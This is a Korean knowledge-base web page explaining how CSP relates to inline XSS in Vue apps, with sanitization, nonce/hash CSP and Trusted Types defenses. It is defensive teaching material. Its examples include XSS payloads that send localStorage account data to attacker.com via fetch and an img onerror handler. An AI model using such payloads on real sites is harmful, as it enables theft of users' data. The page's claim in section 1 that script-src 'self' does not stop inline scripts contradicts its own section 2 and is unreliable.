<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" href="/favicon.ico"/><title>CSP와 inline으로 삽입된 XSS 스크립트의 관계</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal knowledge space"/><meta property="og:title" content="CSP와 inline으로 삽입된 XSS 스크립트의 관계"/><meta property="og:description" content="Personal knowledge space"/><meta property="og:url" content="https://luke-snaw.github.io//notes/fof5x2htn0tr6euz2trv2mu/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="10/13/2025"/><meta property="article:modified_time" content="10/13/2025"/><link rel="canonical" href="https://luke-snaw.github.io//notes/fof5x2htn0tr6euz2trv2mu/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/_next/static/css/8e7b7e4bce421c0a.css" as="style"/><link rel="stylesheet" href="/_next/static/css/8e7b7e4bce421c0a.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-3d209faeb64f2f97.js" defer=""></script><script src="/_next/static/chunks/framework-28c999baf2863c3d.js" defer=""></script><script src="/_next/static/chunks/main-104451f3d1a5c4bc.js" defer=""></script><script src="/_next/static/chunks/pages/_app-9d8e0603730b15a3.js" defer=""></script><script src="/_next/static/chunks/935-4dee79e80b8641c6.js" defer=""></script><script src="/_next/static/chunks/6-50972def09142ee2.js" defer=""></script><script src="/_next/static/chunks/pages/notes/%5Bid%5D-78d472fa3b924116.js" defer=""></script><script src="/_next/static/vOE8u-mg___OsOsz4tjEg/_buildManifest.js" defer=""></script><script src="/_next/static/vOE8u-mg___OsOsz4tjEg/_ssgManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout" style="margin-top:64px;display:flex;flex-direction:row"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><main class="ant-layout-content side-layout-main" style="max-width:1200px;min-width:0;display:block"><div style="padding:0 24px"><div class="main-content" role="main"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="csp와-inline으로-삽입된-xss-스크립트의-관계">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden="true" class="anchor-heading icon-link" href="#csp와-inline으로-삽입된-xss-스크립트의-관계"></a></h1>
<h2 id="csp와-inline으로-삽입된-xss-스크립트의-관계-1">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden="true" class="anchor-heading icon-link" href="#csp와-inline으로-삽입된-xss-스크립트의-관계-1"></a></h2>
<h3 id="핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가">핵심 질문: "inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?"<a aria-hidden="true" class="anchor-heading icon-link" href="#핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가"></a></h3>
<p>답변: <strong>맞습니다, 부분적으로 무용지물이 될 수 있습니다.</strong></p>
<h2 id="1-인라인-스크립트와-csp의-한계">1. 인라인 스크립트와 CSP의 한계<a aria-hidden="true" class="anchor-heading icon-link" href="#1-인라인-스크립트와-csp의-한계"></a></h2>
<h3 id="csp가-막을-수-없는-경우">CSP가 막을 수 없는 경우<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-막을-수-없는-경우"></a></h3>
<pre class="language-html"><code class="language-html"><span class="token comment">&#x3C;!-- v-html로 직접 삽입된 악성 스크립트 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>div</span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token comment">// 이 스크립트는 이미 DOM에 삽입되어 실행됨</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://attacker.com/steal"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
      body<span class="token operator">:</span> <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">"accountInfo"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;/</span>div</span><span class="token punctuation">></span></span>
</code></pre>
<p>CSP가 <code>script-src 'self'</code>로 설정되어 있어도, <strong>이미 DOM에 삽입된 인라인 스크립트</strong>는 차단되지 않습니다.</p>
<h2 id="2-csp가-효과적인-경우">2. CSP가 효과적인 경우<a aria-hidden="true" class="anchor-heading icon-link" href="#2-csp가-효과적인-경우"></a></h2>
<p>하지만 CSP는 여전히 중요한 방어층입니다:</p>
<h3 id="csp-설정-예시">CSP 설정 예시<a aria-hidden="true" class="anchor-heading icon-link" href="#csp-설정-예시"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
  script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>  <span class="token comment">// 인라인 스크립트 차단</span>
  connect<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> <span class="token comment">// 외부 서버 연결 차단</span>
</code></pre>
<h3 id="csp가-차단하는-것들">CSP가 차단하는 것들<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-차단하는-것들"></a></h3>
<ul>
<li>❌ <code>&#x3C;script src="https://evil.com/malicious.js"></code> - 외부 스크립트 로드</li>
<li>❌ <code>eval()</code>, <code>Function()</code> 같은 동적 코드 실행</li>
<li>❌ <code>fetch('https://attacker.com')</code> - 외부 서버로 데이터 전송</li>
<li>❌ 이벤트 핸들러 속성 (<code>onclick</code>, <code>onerror</code> 등)</li>
</ul>
<h2 id="3-실제-공격-시나리오에서-csp의-역할">3. 실제 공격 시나리오에서 CSP의 역할<a aria-hidden="true" class="anchor-heading icon-link" href="#3-실제-공격-시나리오에서-csp의-역할"></a></h2>
<pre class="language-html"><code class="language-html"><span class="token comment">&#x3C;!-- 공격자가 삽입한 XSS --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>img</span>
  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span>
  <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//attacker.com?c='</span><span class="token operator">+</span><span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">'accountInfo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span>
<span class="token punctuation">/></span></span>
</code></pre>
<h3 id="csp가-있을-때-차단되는-것들">CSP가 있을 때 차단되는 것들<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-있을-때-차단되는-것들"></a></h3>
<ul>
<li><code>img-src 'self'</code> → 외부 이미지 로드 차단</li>
<li><code>connect-src 'self'</code> → attacker.com으로 fetch 차단</li>
<li><code>script-src 'self'</code> → onerror 인라인 이벤트 핸들러 차단</li>
</ul>
<h2 id="4-올바른-방어-전략-defense-in-depth">4. 올바른 방어 전략: Defense in Depth<a aria-hidden="true" class="anchor-heading icon-link" href="#4-올바른-방어-전략-defense-in-depth"></a></h2>
<p>단일 방어 메커니즘에 의존하지 않고 <strong>다층 방어</strong>가 필요합니다:</p>
<h3 id="1단계-입력-검증-서버-측">1단계: 입력 검증 (서버 측)<a aria-hidden="true" class="anchor-heading icon-link" href="#1단계-입력-검증-서버-측"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// 주의: 기본적인 예시 - 실제로는 불완전함</span>
<span class="token keyword">function</span> <span class="token function">validateInput</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// HTML 태그 제거 또는 이스케이프</span>
  <span class="token keyword control-flow">return</span> content<span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&#x3C;script[^>]*>.*?&#x3C;\/script></span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
  <span class="token comment">// ⚠️ 이 방법은 &#x3C;ScRiPt>, &#x3C;script/src=...> 같은 변형을 막지 못함</span>
<span class="token punctuation">}</span>

<span class="token comment">// OWASP 권장: 전문 라이브러리 사용</span>
<span class="token keyword module">import</span> <span class="token imports">validator</span> <span class="token keyword module">from</span> <span class="token string">"validator"</span>
<span class="token keyword module">import</span> <span class="token imports">xss</span> <span class="token keyword module">from</span> <span class="token string">"xss"</span>

<span class="token keyword">function</span> <span class="token function">secureValidateInput</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// HTML 인코딩</span>
  <span class="token keyword">const</span> encoded <span class="token operator">=</span> validator<span class="token punctuation">.</span><span class="token method function property-access">escape</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
  <span class="token comment">// 또는 XSS 필터링 라이브러리 사용</span>
  <span class="token keyword control-flow">return</span> <span class="token function">xss</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>추가 권장사항:</strong></p>
<ul>
<li>WAF (Web Application Firewall) 도입 고려</li>
<li>OWASP AntiSamy, ESAPI 등 검증된 라이브러리 사용</li>
</ul>
<h3 id="2단계-출력-시-sanitization">2단계: 출력 시 Sanitization<a aria-hidden="true" class="anchor-heading icon-link" href="#2단계-출력-시-sanitization"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token keyword module">import</span> <span class="token imports"><span class="token maybe-class-name">DOMPurify</span></span> <span class="token keyword module">from</span> <span class="token string">"dompurify"</span>

<span class="token keyword module">export</span> <span class="token keyword module">default</span> <span class="token punctuation">{</span>
  computed<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token function">safeContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword control-flow">return</span> <span class="token maybe-class-name">DOMPurify</span><span class="token punctuation">.</span><span class="token method function property-access">sanitize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">userContent</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token constant">ALLOWED_TAGS</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"br"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token constant">ALLOWED_ATTR</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="3단계-엄격한-csp-설정">3단계: 엄격한 CSP 설정<a aria-hidden="true" class="anchor-heading icon-link" href="#3단계-엄격한-csp-설정"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// Nonce 기반 CSP (동적 콘텐츠에 적합)</span>
<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'none'</span><span class="token punctuation">;</span>
  script<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'nonce-random123'</span><span class="token punctuation">;</span>  <span class="token comment">// 각 요청마다 새로운 nonce 생성</span>
  style<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'unsafe-inline'</span><span class="token punctuation">;</span>
  img<span class="token operator">-</span>src <span class="token string">'self'</span> data<span class="token operator">:</span><span class="token punctuation">;</span>
  connect<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
  frame<span class="token operator">-</span>ancestors <span class="token string">'none'</span><span class="token punctuation">;</span>

<span class="token comment">// Hash 기반 CSP (정적 콘텐츠에 적합)</span>
<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
  script<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</span><span class="token punctuation">;</span>
  <span class="token comment">// 특정 인라인 스크립트의 SHA-256 해시만 허용</span>
</code></pre>
<p><strong>Nonce vs Hash:</strong></p>
<ul>
<li><strong>Nonce</strong>: 매 요청마다 서버가 생성하는 랜덤 값. Stored XSS 시 공격자가 nonce를 예측할 수 없어 효과적</li>
<li><strong>Hash</strong>: 정적 인라인 스크립트의 해시값. 변경되지 않는 코드에 적합</li>
</ul>
<h3 id="3-1단계-csp-report-only-모드로-테스트">3-1단계: CSP Report-Only 모드로 테스트<a aria-hidden="true" class="anchor-heading icon-link" href="#3-1단계-csp-report-only-모드로-테스트"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// 프로덕션 배포 전 테스트</span>
<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">-</span><span class="token maybe-class-name">Report</span><span class="token operator">-</span><span class="token maybe-class-name">Only</span><span class="token operator">:</span>
  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
  script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
  report<span class="token operator">-</span>uri <span class="token operator">/</span>csp<span class="token operator">-</span>violation<span class="token operator">-</span>report<span class="token punctuation">;</span>
  <span class="token comment">// CSP 위반 시 차단하지 않고 보고만 함</span>
</code></pre>
<h2 id="5-v-html의-위험성과-대안">5. v-html의 위험성과 대안<a aria-hidden="true" class="anchor-heading icon-link" href="#5-v-html의-위험성과-대안"></a></h2>
<h3 id="위험한-코드">위험한 코드<a aria-hidden="true" class="anchor-heading icon-link" href="#위험한-코드"></a></h3>
<pre class="language-vue"><code class="language-vue">&#x3C;div v-html="notice.content">&#x3C;/div>
</code></pre>
<h3 id="안전한-대안">안전한 대안<a aria-hidden="true" class="anchor-heading icon-link" href="#안전한-대안"></a></h3>
<pre class="language-vue"><code class="language-vue">&#x3C;!-- 1. 텍스트로만 렌더링 -->
&#x3C;div v-text="notice.content">&#x3C;/div>

&#x3C;!-- 2. DOMPurify로 정화된 HTML -->
&#x3C;div v-html="sanitizedContent">&#x3C;/div>

&#x3C;!-- 3. Markdown 파서 사용 (사용자 콘텐츠를 안전하게) -->
&#x3C;template>
  &#x3C;div v-html="parsedMarkdown">&#x3C;/div>
&#x3C;/template>

&#x3C;script>
import marked from "marked"
import DOMPurify from "dompurify"

export default {
  computed: {
    parsedMarkdown() {
      // Markdown을 HTML로 변환 후 정화
      const rawHtml = marked.parse(this.userContent)
      return DOMPurify.sanitize(rawHtml)
    },
  },
}
&#x3C;/script>

&#x3C;!-- 4. 코드 하이라이팅이 필요한 경우 -->
&#x3C;script>
import hljs from "highlight.js"
import DOMPurify from "dompurify"

// DOMPurify 훅 추가로 코드 블록 안전하게 처리
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "CODE") {
    hljs.highlightElement(node)
  }
})
&#x3C;/script>
</code></pre>
<h2 id="6-최신-보안-트렌드-csp-level-3-trusted-types">6. 최신 보안 트렌드: CSP Level 3 Trusted Types<a aria-hidden="true" class="anchor-heading icon-link" href="#6-최신-보안-트렌드-csp-level-3-trusted-types"></a></h2>
<h3 id="trusted-types를-사용한-xss-완화">Trusted Types를 사용한 XSS 완화<a aria-hidden="true" class="anchor-heading icon-link" href="#trusted-types를-사용한-xss-완화"></a></h3>
<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// CSP에 Trusted Types 정책 추가</span>
<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
  require<span class="token operator">-</span>trusted<span class="token operator">-</span>types<span class="token operator">-</span><span class="token keyword control-flow">for</span> <span class="token string">'script'</span><span class="token punctuation">;</span>
  trusted<span class="token operator">-</span>types myPolicy<span class="token punctuation">;</span>

<span class="token comment">// JavaScript에서 Trusted Types 정책 생성</span>
<span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">trustedTypes</span> <span class="token operator">&#x26;&#x26;</span> trustedTypes<span class="token punctuation">.</span><span class="token property-access">createPolicy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> myPolicy <span class="token operator">=</span> trustedTypes<span class="token punctuation">.</span><span class="token method function property-access">createPolicy</span><span class="token punctuation">(</span><span class="token string">'myPolicy'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">createHTML</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span>
      <span class="token comment">// DOMPurify로 정화 후 TrustedHTML 반환</span>
      <span class="token keyword control-flow">return</span> <span class="token maybe-class-name">DOMPurify</span><span class="token punctuation">.</span><span class="token method function property-access">sanitize</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">createScript</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span>
      <span class="token comment">// 스크립트는 완전히 차단</span>
      <span class="token keyword control-flow">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Scripts not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Vue.js와 결합</span>
<span class="token keyword module">export</span> <span class="token keyword module">default</span> <span class="token punctuation">{</span>
  <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Trusted Types가 적용되면 innerHTML 직접 할당이 차단됨</span>
    <span class="token comment">// this.$el.innerHTML = userContent; // ❌ 차단됨</span>

    <span class="token comment">// 정책을 통해서만 가능</span>
    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">myPolicy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">$el</span><span class="token punctuation">.</span><span class="token property-access">innerHTML</span> <span class="token operator">=</span> myPolicy<span class="token punctuation">.</span><span class="token method function property-access">createHTML</span><span class="token punctuation">(</span>userContent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>장점:</strong></p>
<ul>
<li>DOM XSS sink(innerHTML, outerHTML 등)를 근본적으로 차단</li>
<li>Vue.js의 v-html도 Trusted Types 정책 적용 가능</li>
<li>브라우저 레벨에서 XSS 방지</li>
</ul>
<h2 id="결론">결론<a aria-hidden="true" class="anchor-heading icon-link" href="#결론"></a></h2>
<h3 id="csp만으로는-불충분하지만-여전히-중요합니다">CSP만으로는 불충분하지만, 여전히 중요합니다<a aria-hidden="true" class="anchor-heading icon-link" href="#csp만으로는-불충분하지만-여전히-중요합니다"></a></h3>
<ol>
<li>
<p><strong>CSP의 한계</strong>:</p>
<ul>
<li>Stored XSS로 이미 삽입된 인라인 스크립트는 막기 어려움</li>
<li>특히 <code>unsafe-inline</code>을 허용하면 거의 무용지물</li>
</ul>
</li>
<li>
<p><strong>그래도 CSP가 필요한 이유</strong>:</p>
<ul>
<li>외부 리소스 로드 차단</li>
<li>데이터 유출 경로 차단</li>
<li>공격의 영향 범위 제한</li>
</ul>
</li>
<li>
<p><strong>올바른 접근 방법</strong>:</p>
<ul>
<li><strong>입력 검증</strong> (서버 측) - OWASP 권장 라이브러리 사용</li>
<li><strong>출력 인코딩/Sanitization</strong> (클라이언트 측)</li>
<li><strong>엄격한 CSP</strong> (추가 방어층) - Nonce/Hash 활용</li>
<li><strong>v-html 사용 최소화</strong> - Markdown 파서 등 대안 활용</li>
<li><strong>Trusted Types</strong> (최신 브라우저) - DOM XSS 근본 차단</li>
</ul>
</li>
</ol>
<h2 id="보안-체크리스트">보안 체크리스트<a aria-hidden="true" class="anchor-heading icon-link" href="#보안-체크리스트"></a></h2>
<h3 id="필수-구현-사항">필수 구현 사항<a aria-hidden="true" class="anchor-heading icon-link" href="#필수-구현-사항"></a></h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled> CSP (Content Security Policy) 설정
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled> Nonce 또는 Hash 기반 정책 적용</li>
<li class="task-list-item"><input type="checkbox" disabled> Report-Only 모드로 테스트 후 적용</li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" checked disabled> <code>v-html</code> 사용 위치 전수 검사</li>
<li class="task-list-item"><input type="checkbox" disabled> 서버 측 입력 검증
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled> OWASP 권장 라이브러리 (validator.js, xss 등) 사용</li>
<li class="task-list-item"><input type="checkbox" disabled> WAF 도입 검토</li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" disabled> 클라이언트 측 Sanitization
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled> DOMPurify 라이브러리 적용</li>
<li class="task-list-item"><input type="checkbox" disabled> Markdown 파서 사용 시 정화 적용</li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" disabled> CSP Level 3 Trusted Types 도입 (모던 브라우저)</li>
<li class="task-list-item"><input type="checkbox" checked disabled> HttpOnly 쿠키 사용 고려 (CSRF 복잡도 vs localStorage)</li>
</ul>
<h3 id="권장-구현-순서">권장 구현 순서<a aria-hidden="true" class="anchor-heading icon-link" href="#권장-구현-순서"></a></h3>
<ol>
<li><strong>즉시</strong>: v-html 제거 또는 DOMPurify 적용</li>
<li><strong>단기</strong>: 서버 측 입력 검증 강화</li>
<li><strong>중기</strong>: CSP Report-Only 모드 테스트</li>
<li><strong>장기</strong>: Trusted Types 도입</li>
</ol>
<blockquote>
<p><strong>핵심</strong>: v-html을 제거하거나 Sanitization을 적용하는 것이 CSP보다 더 근본적인 해결책입니다. CSP는 추가적인 방어층으로 활용해야 합니다. <strong>Defense in Depth</strong> 전략으로 다층 방어를 구축하세요.</p>
</blockquote></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp와-inline으로-삽입된-xss-스크립트의-관계" title="CSP와 inline으로 삽입된 XSS 스크립트의 관계">CSP와 inline으로 삽입된 XSS 스크립트의 관계</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가" title="핵심 질문: &quot;inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?&quot;">핵심 질문: &quot;inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?&quot;</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#1-인라인-스크립트와-csp의-한계" title="1. 인라인 스크립트와 CSP의 한계">1. 인라인 스크립트와 CSP의 한계</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp가-막을-수-없는-경우" title="CSP가 막을 수 없는 경우">CSP가 막을 수 없는 경우</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#2-csp가-효과적인-경우" title="2. CSP가 효과적인 경우">2. CSP가 효과적인 경우</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp-설정-예시" title="CSP 설정 예시">CSP 설정 예시</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp가-차단하는-것들" title="CSP가 차단하는 것들">CSP가 차단하는 것들</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#3-실제-공격-시나리오에서-csp의-역할" title="3. 실제 공격 시나리오에서 CSP의 역할">3. 실제 공격 시나리오에서 CSP의 역할</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#csp가-있을-때-차단되는-것들" title="CSP가 있을 때 차단되는 것들">CSP가 있을 때 차단되는 것들</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#4-올바른-방어-전략-defense-in-depth" title="4. 올바른 방어 전략: Defense in Depth">4. 올바른 방어 전략: Defense in Depth</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#1단계-입력-검증-서버-측" title="1단계: 입력 검증 (서버 측)">1단계: 입력 검증 (서버 측)</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#2단계-출력-시-sanitization" title="2단계: 출력 시 Sanitization">2단계: 출력 시 Sanitization</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#3단계-엄격한-csp-설정" title="3단계: 엄격한 CSP 설정">3단계: 엄격한 CSP 설정</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#3-1단계-csp-report-only-모드로-테스트" title="3-1단계: CSP Report-Only 모드로 테스트">3-1단계: CSP Report-Only 모드로 테스트</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#5-v-html의-위험성과-대안" title="5. v-html의 위험성과 대안">5. v-html의 위험성과 대안</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#위험한-코드" title="위험한 코드">위험한 코드</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#안전한-대안" title="안전한 대안">안전한 대안</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#6-최신-보안-트렌드-csp-level-3-trusted-types" title="6. 최신 보안 